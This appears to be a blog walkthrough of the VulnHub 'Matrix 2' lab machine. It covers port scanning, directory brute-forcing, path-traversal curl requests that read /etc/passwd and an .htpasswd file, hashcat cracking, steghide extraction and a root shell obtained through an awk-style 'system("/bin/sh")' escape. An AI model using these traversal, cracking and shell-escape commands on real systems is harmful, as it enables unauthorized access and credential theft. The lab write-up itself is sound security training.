[Link to VulnHub](https://www.vulnhub.com/entry/matrix-2,279/)

Install the box, start it...

Load nmap and scan for IP address

~~~
$ nmap -sn 192.168.56.0/24 
Nmap scan report for 192.168.56.105
Host is up (0.00083s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.32 seconds
~~~

Access the machine. Ok nothing here. Scan opened ports with nmap

~~~
$ nmap 192.168.56.105
Nmap scan report for 192.168.56.105
Host is up (0.00088s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
~~~

Only port 80 open... nah I don't believe it, we're going to scan EVERY port on the machine. Light up the christmas tree!!

~~~
nmap -p 0-65355 192.168.56.105
Nmap scan report for 192.168.56.105
Host is up (0.0019s latency).
Not shown: 65351 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
1337/tcp  open  waste
12320/tcp open  unknown
12321/tcp open  warehouse-sss
12322/tcp open  warehouse
~~~

Knew it. Well, let's try them out!

~~~
https://192.168.56.105:1337/
~~~

Nothing except a htaccess login form.

~~~
gobuster dir -u http://192.168.56.105:1337 -w /wordlist.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.105:1337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /wordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

Error: the server returns a status code that matches the provided options for non existing urls. http://192.168.56.105:1337/2d3e662d-255c-425f-9cdc-8f4ddb54ab0a => 400 (Length: 264). To continue please exclude the status code or the length
~~~

What, never seen this error before... After some looking around, ```----exclude-length``` is what we are looking for.

~~~
$ gobuster dir -u https://192.168.56.105:1337 -w ./wordlist.txt  --exclude-length 256

Error: error on running gobuster: unable to connect to https://192.168.56.105:1337/: Get "https://192.168.56.105:1337/": tls: failed to verify certificate: x509: cannot validate certificate for 192.168.56.105 because it doesn't contain any IP SANs
~~~

Oh, FFS, what's that now.

~~~
gobuster dir --help
[...]
-k, --no-tls-validation                 Skip TLS certificate verification
[...]
$ gobuster dir -u https://192.168.56.105:1337 -w ./wordlist.txt  --exclude-length 256 -k
Error: the server returns a status code that matches the provided options for non existing urls. https://192.168.56.105:1337/5590a1ce-1f54-4cef-916e-25c359e9ff6c => 401 (Length: 188). To continue please exclude the status code or the length
gobuster dir -u https://192.168.56.105:1337 -w /wordlist.txt  --exclude-length 256,188 -k
[...]
Starting gobuster in directory enumeration mode
~~~

Finally !! 


~~~
===============================================================
Progress: 1828 / 1829 (99.95%)
===============================================================
Finished
===============================================================
~~~

You got to be kidding me !!!  Well, what else did we have, port ```12320``` is next.  We get a linux login console. Ok. Quick gobuster.
~~~
$ gobuster dir -u https://192.168.56.105:12320 -w ./wordlist.txt  --exclude-length 256 -k
[...]
/secure               (Status: 200) [Size: 5216]
~~~

Same login screen when accessing this url. Let's move on to another port  ```12321```... Accept the self signed cert.  PR_CONNECT_RESET_ERROR... Let's move on to ```12322``` 
Hum... Looks the same as port 80.

~~~
$ gobuster dir -u https://192.168.56.105:12322 -w ./wordlist.txt  --exclude-length 256 -k
$ gobuster dir -u https://192.168.56.105:12322 -w /wordlist.txt  --exclude-length 256,2985 -k
===============================================================
/robots.txt           (Status: 200) [Size: 38]
/css                  (Status: 301) [Size: 178] [--> https://192.168.56.105:12322/css/]
/js                   (Status: 301) [Size: 178] [--> https://192.168.56.105:12322/js/]
~~~

Let's access the robots.txt file
~~~
User-agent: *
Disallow: file_view.php
~~~

Interesting. 

Fun fact about ```robots.txt ```, I once got into a argument with a director a couple of years back about an app we were developing, and the fact that it had to serve images only to auth users. I suggested that we put the files in a private filesystem in order for the images not to be accessed by any bots. His answer was to put an entry in the robots.txt file to disallow indexing.
The argument was that while it does disallow indexing, it does not disallow direct file access. So I submitted papers and data to prove my point, that  ```robots.txt  ``` are far from being secure, and not at all the place to hide sensitive files and that it was a really bad idea.

Couple of days later, I was let go.

So let's acces the file in the robots.txt file then.

~~~
view-source:https://192.168.56.105:12322/file_view.php
~~~

White page... What's the source of this ? CTRL + U

~~~
<!-- Error file parameter missing..!!! -->
~~~

Sorry about that, here is your file parameter then

~~~
https://192.168.56.105:12322/file_view.php?/etc/passwd
<!-- Error file parameter missing..!!! -->
~~~

Hum, maybe he's looking for a POST request ? Let's try with Postman. 
First, I got an error with self-signed certificate, so I disabled SSL certificate verification.
Next, I added a ```body``` to the request with a ```file``` key and ```index.php``` as a value in ```form-data``` mode.

Empty response, no more missing parameter. So it works, the file is just not in this directory...

Change ```file``` value to ```../index.php```.  Allright !!!

Here is a curl command that will replicate what the Postman Call does

~~~
curl --location 'https://192.168.56.105:12322/file_view.php' \
--form 'file="../index.php"' -k
~~~

Let's try something funky, can we access __any files__ in the system ?

~~~
curl --location 'https://192.168.56.105:12322/file_view.php' \
--form 'file="/../../../etc/passwd"' -k
~~~

Nothing...

~~~
curl --location 'https://192.168.56.105:12322/file_view.php' \
--form 'file="/../../../../etc/passwd"' -k
~~~

Nothing...

~~~
curl --location 'https://192.168.56.105:12322/file_view.php' \
--form 'file="/../../../../../etc/passwd"' -k
~~~

Ohhh... that's bad! Well, good for us, but bad for the system's security. Read this [answer](https://security.stackexchange.com/a/92769) to learn more about the impication of having access to the /etc/passwd file of a unix system.

Now, there are a couple of users on that box, but most of them have a "nologin" flag.  Those might be of interest, let's keep them in our loot box for later

~~~
n30:x:1000:1000:Neo,,,:/home/n30:/bin/bash
testuser:x:1001:1001::/home/testuser:
~~~

Where do we go from now... We can acces files on the server if we know where they are

~~~
$ whatweb 192.168.56.105
http://192.168.56.105 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.10.3], IP[192.168.56.105], Script, Title[Welcome in Matrix v2 Neo], nginx[1.10.3]
~~~

We are dealing with a nginx server. Quick google for nginx site configuration file location... Main Configuration File: /etc/nginx/nginx.conf.

~~~
$ curl --location 'https://192.168.56.105:12322/file_view.php' --form 'file="../../../../../etc/nginx/nginx.conf"' -k
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

[...]
   include /etc/nginx/conf.d/*.conf;
   include /etc/nginx/sites-enabled/*;

~~~~

Alright, we can see the websites config are located in  ```/etc/nginx/sites-enabled/``` let's good what's the default website config.  Turns out it's ```default```. 

~~~
$ curl --location 'https://192.168.56.105:12322/file_view.php' --form 'file="../../../../../etc/nginx/sites-enabled/default"' -k
server {
    listen 0.0.0.0:80;
    root /var/www/4cc3ss/;
    index index.html index.php;

    include /etc/nginx/include/php;
}

server {
    listen 1337 ssl;
    root /var/www/;
    index index.html index.php;

auth_basic "Welcome to Matrix 2";
auth_basic_user_file /var/www/p4ss/.htpasswd;   <----

    fastcgi_param HTTPS on;
    include /etc/nginx/include/ssl;
    include /etc/nginx/include/php;
}

~~~~

Let's try to access this .htpasswd file 

~~~
$ curl --location 'https://192.168.56.105:12322/file_view.php' --form 'file="../../../../../var/www/p4ss/.htpasswd"' -k
Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0
~~~~

Alright, let's dehash this! First, we need to know what type of hash it we're working against. The $arp1$ string at the start tells us it's an MD5 ARP hash. You can use online tools like [hashes.com](https://hashes.com/en/tools/hash_identifier) to check.

Then, you can lookup the [Hashcat's hast type Wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) in order to find the hash mode

|  Hash-Mode | Hash-Name |	Example |
| :-------- | :-------: | :-------: |
|1600 	|Apache $apr1$ MD5, md5apr1, MD5 (APR) 2 |	$apr1$71850310$gh9m4xcAn3MGxogwX/ztb. |

~~~
$ hashcat  $apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0 -m 1600 /usr/share/wordlist/rockyou.txt 
Hash 'tu4e5pd/IHVFcQ2wER0': Separator unmatched
No hashes loaded.
~~~~

Whut ? Ohhh... The ```$``` sings makes the command line tool thinks we're using variable. We'll need to put the hash in a text file and use this in the CLI call.

~~~
$ touch htpasswd && nano htpasswd
CTRL + V
CTRL + O
CTRL + X 
~~~

Load up hashcat using this file instead
~~~
$ hashcat htpasswd -m 1600 /usr/share/wordlist/rockyou.txt
Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 181 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlist/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0:[REMOVED]  
~~~

Let's try it out.  Ok, it's not that much different from the site on port 80. but there is a text with a typo in Neo, written n3o. Let's keep that in out loot boxe. 

Inspect the source ? 

~~~
title>Welcome in Matrix v2 Neo</title>

<link rel="stylesheet" href="4cc3ss/css/style.css">  <--- this folder "4cc3ss" is standing out. let's keep it in our loot.
~~~

There is also something else 

~~~
</h4>
<!--img src="h1dd3n.jpg"-->
~~~

Access the file, ok let's save this and run exiftool on it.

~~~
$ exiftool h1dd3n.jpg 
~~~

Nothing stands out.  Hum... I remember in the Tv Show Mr.Robot, Elliot used a tool to save data to image file, a process called [Steganography](https://en.wikipedia.org/wiki/Steganography).
Quick search on [Kali tools index](https://www.kali.org/tools/) : Steghide

~~~
$ steghide extract -sf h1dd3n.jpg -p 4cc3ss
steghide: could not extract any data with that passphrase!

steghide extract -sf h1dd3n.jpg -p n30
wrote extracted data to "n30.txt".
~~~

Sweet! And the file contains single word [REMOVED].  
Looking at our lootbox, we did have a linux login screen on port 12320. Let's try to login with the user n30 and the password from the image.

~~~
Matrix_2 login: n30                                                                                                                                                                                                                                            
Password:                                                                                                                                                                                                                                                      
Welcome to Matrix_2, TurnKey GNU/Linux 15.1 / TurnKey 9.6 Stretch                                                                                                                                                                                              


  System information (as of Mon May 04 16:36:19 2026)                                                                                                                                                                                                          


    System load:  0.00              Memory usage:  17%                                                                                                                                                                                                         
    Processes:    89                Swap usage:    0%                                                                                                                                                                                                          
    Usage of /:   6.4% of 16.61GB   IP address for eth0:  192.168.56.106                                                                                                                                                                                       


  TKLBAM (Backup and Migration):  NOT INITIALIZED                                                                                                                                                                                                              


    To initialize TKLBAM, run the "tklbam-init" command to link this                                                                                                                                                                                           
    system to your TurnKey Hub account. For details see the man page or                                                                                                                                                                                        
    go to:                                                                                                                                                                                                                                                     


        https://www.turnkeylinux.org/tklbam                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                               
Linux Matrix_2 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64                                                                                                                                                                                       
===================================================================================                                                                                                                                                                            
                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                               
Welcome to Matrix_2, GNU/Linux 15.1 /                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                               
  __  __       _        _        ___                                                                                                                                                                                                                           
 |  \/  |     | |      (_)      |__ \                                                                                                                                                                                                                          
 | \  / | __ _| |_ _ __ ___  __    ) |                                                                                                                                                                                                                         
 | |\/| |/ _` | __| '__| \ \/ /   / /                                                                                                                                                                                                                          
 | |  | | (_| | |_| |  | |>  <   / /_                                                                                                                                                                                                                          
 |_| _|_|\__,_|\__|_|  |_/_/\_\ |____|                                                                                                                                                                                                                         
    |  _ \                                                                                                                                                                                                                                                     
    | |_) |_   _                                                                                                                                                                                                                                               
    |  _ <| | | |                                                                                                                                                                                                                                              
    | |_) | |_| |                                                                                                                                                                                                                                              
    |____/ \__, |                                                                                                                                                                                                                                              
            __/ |                                                                                                                                                                                                                                              
           |___/                                 _            _            __ _  _                                                                                                                                                                             
             | |                                | |          (_)          / /| || |                                                                                                                                                                            
  _   _ _ __ | | ___ __   _____      ___ __   __| | _____   ___  ___ ___ / /_| || |_                                                                                                                                                                           
 | | | | '_ \| |/ / '_ \ / _ \ \ /\ / / '_ \ / _` |/ _ \ \ / / |/ __/ _ \ '_ \__   _|                                                                                                                                                                          
 | |_| | | | |   <| | | | (_) \ V  V /| | | | (_| |  __/\ V /| | (_|  __/ (_) | | |                                                                                                                                                                            
  \__,_|_| |_|_|\_\_| |_|\___/ \_/\_/ |_| |_|\__,_|\___| \_/ |_|\___\___|\___/  |_|                                                                                                                                                                            


                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                               
Linux Matrix_2 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64                                                                                                                                                                                       
                                                                                                                                                                                                                                                               
===================================================================================                                                                                                                                                                            
~~~

Ok, let's see what's here

~~~
n30@Matrix_2 ~$ ls -la
total 36
drwxr-xr-x 5 n30  n30  4096 Dec  8  2018 .
drwxr-xr-x 3 root root 4096 Dec  7  2018 ..
-rw------- 1 n30  n30   950 Dec 13  2018 .bash_history
-rw-r--r-- 1 n30  n30   220 Dec  7  2018 .bash_logout
-rw-r--r-- 1 n30  n30  2083 Dec  7  2018 .bashrc
drwxr-xr-x 2 n30  n30  4096 Dec  7  2018 .bashrc.d
-rw-r--r-- 1 n30  n30     0 Dec  8  2018 .penv
-rw-r--r-- 1 n30  n30   746 Dec  7  2018 .profile
drwxr-xr-x 2 n30  n30  4096 Dec  7  2018 .profile.d
-rw-r--r-- 1 n30  n30     0 May  4 16:36 .sdirs
drwx------ 2 n30  n30  4096 Dec  7  2018 .ssh
~~~

Oh, we have a .bash_history file. let's look at it.

~~~
n30@Matrix_2 ~$ tail .bash_history
exit
whoami
id
uid
whoami
exit
morpheus 'BEGIN {system("/bin/sh")}'
su
exit
exit
~~~

What is that morpheus thing ??? Let's try it

~~~
morpheus 'BEGIN {system("/bin/sh")}'
#
# ls
# pwd
/home/n30
~~~

Can we move to /root ?

~~~
# cd /root
# ls -la
flag.txt
# cat flag.txt
~~~

This was fun! This machine showed the importance of taking notes and having a lootbox. I like to use [Obsidian](https://obsidian.md/) for that, but any note taking app would do. You can also use [Bookstack](https://www.bookstackapp.com/) if you prefer a self-hosted approach.

All right, until next time!

~~~
exit
exit
~~~